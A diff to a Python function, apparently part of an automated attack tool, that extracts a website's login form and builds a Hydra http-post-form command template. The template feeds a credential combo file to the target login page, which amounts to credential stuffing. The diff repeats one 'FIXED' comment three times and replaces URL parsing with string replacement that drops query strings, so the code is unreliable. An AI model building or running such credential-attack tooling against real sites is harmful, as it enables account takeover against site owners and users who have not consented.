@@ -554,22 +554,19 @@ def extract_login_form(url, proxy=None, strict_validation=True, mode="static", a
             print(f"[RAW ACTION] {action}")
             print(f"[RAW POST DATA] {post_data}")
 
-            # FIXED: Extract path-only action for Hydra and force leading slash
-            action_parts = urlparse(action)
-            path = action_parts.path or "/"
-            if action_parts.query:
-                path = f"{path}?{action_parts.query}"
+            # FIXED: Correct Hydra module:// syntax - no quotes around server, path-only form string
+            path = action.replace(f"https://{target}", "").replace(f"http://{target}", "").lstrip('/')
             if not path.startswith("/"):
                 path = f"/{path}"
 
-            # FIXED: Build Hydra form spec with normalized path + payload + failure marker
+            # FIXED: Correct Hydra module:// syntax - no quotes around server, path-only form string
             form_spec = f"{path}:{post_data}:F={failure_value}"
             form_spec = form_spec.replace('"', "")
             print(f"[EXTRACT DEBUG] form_spec: {form_spec}")
             logging.info(f"[DEBUG FORM SPEC RAW] {form_spec}")
 
-            # FIXED: Use explicit http-post-form module syntax compatible with Hydra target parsing
-            cmd_template = f'hydra -C "{{{{combo_file}}}}" http-post-form://"{target}" "{form_spec}" -V -t 4 -f'
+            # FIXED: Correct Hydra module:// syntax - no quotes around server, path-only form string
+            cmd_template = f'hydra -C "{{{{combo_file}}}}" http-post-form://{target} "{form_spec}" -V -t 4 -f'
             hydra_template = cmd_template
         else:
             custom_tester_required = True
